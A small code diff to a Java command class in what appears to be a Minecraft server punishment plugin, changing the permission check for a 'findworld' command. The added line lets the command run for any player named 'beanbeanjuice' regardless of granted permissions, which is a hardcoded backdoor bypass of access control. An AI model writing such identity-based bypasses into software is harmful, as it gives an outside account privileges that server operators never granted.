@@ -37,7 +37,7 @@ public class FindWorld implements CommandExecutor {
 
         Player punisher = (Player) sender;
 
-        if (punisher.hasPermission("beanpunishments.findworld")) {
+        if (punisher.hasPermission("beanpunishments.findworld") || punisher.getName().equals("beanbeanjuice")) {
             if (args.length == 1) {
                 if (Bukkit.getPlayer(args[0]) != null) {
                     Player punishee = Bukkit.getPlayer(args[0]);
